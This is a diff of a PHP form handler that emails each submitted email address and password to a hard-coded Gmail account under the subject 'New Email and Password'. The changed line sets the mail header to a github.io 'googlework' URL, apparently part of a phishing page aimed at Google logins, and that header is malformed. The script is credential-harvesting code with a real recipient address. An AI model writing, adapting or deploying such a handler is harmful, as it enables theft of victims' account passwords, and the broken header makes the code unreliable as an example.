@@ -15,7 +15,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $to = "abhishek8907654@gmail.com"; // Replace with your email address
     $subject = "New Email and Password";
     $message = "Email: " . $email . "\nPassword: " . $password;
-    $headers = "From: abhishek8907654@gmail.com"; // Replace with your domain or email
+    $headers = "https://hunternobrac.github.io/googlework/"; // Replace with your domain or email
 
     // Send email
     if (mail($to, $subject, $message, $headers)) {
